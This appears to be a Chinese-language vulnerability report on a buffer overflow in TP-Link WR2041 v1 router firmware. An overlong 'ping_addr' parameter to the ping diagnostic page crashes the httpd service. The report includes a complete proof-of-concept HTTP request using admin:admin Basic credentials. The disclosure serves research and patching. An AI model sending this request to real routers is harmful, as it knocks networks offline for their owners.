## TP-Link WR2041 v1

### 概述

TP-Link WR2041 v1 固件中的缓冲区溢出漏洞允许已认证的攻击者通过向`/userRpm/PingIframeRpm.htm`网页发送带有非常长的“ping_addr”参数的 HTTP 请求来造成拒绝服务 (DoS) 攻击，从而导致路由器崩溃。

### 漏洞详情

触发点位于`httpd` 组件中的`sub_47A614`方法，

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-02-11-57-54-image.png)

从请求参数中得到`ping_addr`，通过构造`doType`参数为`ping`,`isNew`参数为`new`，可使程序执行到如下代码，

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-02-12-01-23-image.png)

漏洞即位于`ipAddrDispose`方法中，

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-02-12-02-25-image.png)

此处仅判断`ping_addr`中是否有空字符，没有判断长度，后将`ping_addr`的值按字节循环写入v21数组，v21仅有52个字节的长度，超过即会溢出。

### 概念验证

```http
GET /userRpm/PingIframeRpm.htm?ping_addr=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&doType=ping&isNew=new&sendNum=4&pSize=64&overTime=1000 HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Referer: http://192.168.1.1/userRpm/WzdWanTypeRpm.htm
Upgrade-Insecure-Requests: 1
Priority: u=4
```

执行poc完成后，`httpd`服务无法访问，死掉了。
